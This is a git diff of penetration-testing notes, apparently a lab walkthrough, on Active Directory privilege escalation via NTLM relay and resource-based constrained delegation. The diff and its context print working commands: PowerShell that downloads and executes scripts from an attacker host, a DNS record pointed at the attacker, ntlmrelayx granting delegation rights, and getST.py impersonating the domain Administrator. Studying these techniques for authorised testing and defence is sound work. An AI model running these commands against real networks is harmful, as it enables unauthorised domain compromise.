@@ -77,7 +77,7 @@ New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '12
 
 ![](<../../../../.gitbook/assets/image (56) (1) (1) (1).png>)
 
-3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname.
+3\. Create a DNS record for webdav to our attacking machine with Invoke-DNSUpdate. The DNS record is required for webdav connection to work. It won't connect through an IP only with a hostname. We create a DNS record webdav.amsterdam.bank.local to our attacking machine IP.
 
 ```
 iex (iwr http://192.168.248.3:8090/Invoke-DNSUpdate.ps1 -usebasicparsing)
@@ -88,7 +88,7 @@ Invoke-DNSUpdate -DNSType A -DNSName webdav.amsterdam.bank.local -DNSData 192.16
 
 We now have all our prerequisites. Time to escalate our privileges.
 
-4\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WS01`:
+4\. Run NTLMRelay on our Kali machine and set it up so it will write the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute that allows our created computerobject `FAKE01` to actonbehalf `WEB01`:
 
 ```
 python3 /opt/impacket/examples/ntlmrelayx.py -t ldap://10.0.0.3 --delegate-access --escalate-user FAKE01$ --serve-image ./image.jpg
@@ -103,7 +103,7 @@ iex (iwr http://192.168.248.3:8090/Change-Lockscreen.ps1 -usebasicparsing)
 change-lockscreen -webdav \\webdav@80\
 ```
 
-![](<../../../../.gitbook/assets/image (1) (1).png>)
+![](<../../../../.gitbook/assets/image (1) (1) (1).png>)
 
 When we check the ntlmrelay output we see that `FAKE01` can now impersonate users on `WEB01`.
 
@@ -113,7 +113,7 @@ If we open the attribute editor on DC02 for WEB01 we can see the `msDS-AllowedTo
 
 ![](<../../../../.gitbook/assets/image (51) (1) (1).png>)
 
-6\. Create a ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py. Fill in the password `123456`.
+6\. Create a CIFS service ticket using `FAKE01` impersonating the domain admin `Administrator` using impackets getST.py. Fill in the password `123456`.
 
 ```
 getST.py amsterdam/FAKE01@10.0.0.5 -spn cifs/web01.amsterdam.bank.local -impersonate administrator -dc-ip 10.0.0.3
@@ -147,7 +147,7 @@ Get-ADComputer fake01 | Remove-ADObject
 
 4\. Open "DNS Manager" and expand DC02 --> Forward Lookup Zones --> and click on `Amsterdam.bank.local.`Remove the DNS-record created for webdav:
 
-![](<../../../../.gitbook/assets/image (33) (1) (1).png>)
+![](<../../../../.gitbook/assets/image (33) (1) (1) (1).png>)
 
 4\. From our Kali machine set the SQL server settings back:
 
